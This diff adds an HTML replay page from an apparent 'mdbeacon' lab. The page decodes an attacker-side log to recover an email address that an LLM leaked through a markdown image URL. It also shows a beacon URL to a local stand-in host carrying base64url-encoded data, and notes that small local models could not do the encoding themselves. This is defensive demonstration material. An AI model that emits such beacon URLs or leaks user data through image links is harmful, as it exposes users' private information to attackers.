@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>mdbeacon decode</title>
+<style>
+  body { margin:0; background:#0c0e12; color:#d6d6d6; font-family:Consolas,"Microsoft YaHei",monospace; padding:18px; }
+  h2 { color:#9fd0ff; font-size:15px; margin:0 0 12px; }
+  .row { margin:8px 0; font-size:13px; line-height:1.6; }
+  .k { color:#8a8f9a; }
+  .v { color:#ffd479; word-break:break-all; }
+  .ok { color:#7fffaa; }
+  .box { border:1px solid #2a2f3a; border-radius:8px; padding:12px 14px; margin:10px 0; background:#11151c; }
+  hr { border:0; border-top:1px solid #2a2f3a; margin:16px 0; }
+</style>
+</head>
+<body>
+<h2>mdbeacon-lab / 解码回放：从 exfil.log 还原被外传的邮箱</h2>
+<div id="out">loading...</div>
+<script>
+function b64urlEncode(s){ const b=new TextEncoder().encode(s); let bin=''; b.forEach(x=>bin+=String.fromCharCode(x)); return btoa(bin).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
+function b64urlDecode(s){ let t=s.replace(/-/g,'+').replace(/_/g,'/'); while(t.length%4) t+='='; const bin=atob(t); const u=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i); return new TextDecoder().decode(u); }
+fetch('/exfil.log').then(r=>r.text()).then(t=>{
+  const lines=t.split('\n');
+  const getLine=k=>lines.find(l=>l.includes(k))||'';
+  const reqLine = getLine('GET /p.png');
+  const hitLine = getLine('EXFIL HIT');
+  const decLine = getLine('EXFIL DECODED');
+  // 从 GET 行提取 ?d=...
+  let rawQ='';
+  const m = reqLine.match(/\/p.png\?(\S+)/);
+  if(m) rawQ = m[1];
+  const dval = decodeURIComponent((rawQ.match(/d=([^&\s]+)/)||[])[1]||rawQ||'');
+  const email = (decLine.split('EXFIL DECODED')[1]||'').trim() || dval;
+  const b64 = b64urlEncode(email);
+  const back = b64urlDecode(b64);
+  document.getElementById('out').innerHTML = `
+    <div class="box">
+      <div class="row"><span class="k">1. 攻击者日志收到的请求行：</span></div>
+      <div class="row"><span class="v">${reqLine}</span></div>
+      <div class="row"><span class="k">2. 从 URL query 取出载荷：</span> <span class="v">${rawQ}</span></div>
+      <div class="row"><span class="k">3. URL-decode(d=)：</span> <span class="ok">${dval}</span></div>
+      <div class="row"><span class="k">4. 还原出的邮箱：</span> <span class="ok">${email}</span> ✅</div>
+    </div>
+    <hr>
+    <div class="box">
+      <div class="row"><span class="k">对照：若攻击者改用 base64url 编码（经典隐写形式）：</span></div>
+      <div class="row"><span class="k">  email → base64url：</span> <span class="v">${b64}</span></div>
+      <div class="row"><span class="k">  beacon URL 即：</span> <span class="v">http://127.0.0.1:8090/p.png?d=${b64}</span></div>
+      <div class="row"><span class="k">  base64url decode 回来：</span> <span class="ok">${back}</span> ✅</div>
+      <div class="row"><span class="k">注：本机 qwen2.5:7b/3b 实测无法可靠自行做 base64 编码（输出乱码），故本演示用原样回传；编码可由 UI 侧或更强大模型完成，信道本身不依赖编码。</span></div>
+    </div>`;
+});
+</script>
+</body>
+</html>
